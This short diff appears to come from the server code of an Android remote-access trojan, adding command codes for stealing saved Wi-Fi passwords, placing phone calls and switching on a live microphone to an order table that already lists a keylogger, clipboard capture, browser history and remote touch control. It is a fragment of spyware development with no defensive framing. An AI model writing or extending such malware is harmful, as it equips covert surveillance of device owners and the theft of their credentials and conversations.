@@ -177,7 +177,10 @@ exports.orders = {
   uninstallApp: 'x0000ua',
   clipboard: 'x0000cb',
   wifi: 'x0000wf',
+  wifiPasswords: 'x0000wp',
   screen: 'x0000sc',
+  makeCall: 'x0000mc2',
+  liveMic: 'x0000lm2',
   input: 'x0000in',  // Remote input/touch control
   keylogger: 'x0000kl',
   browserHistory: 'x0000bh',
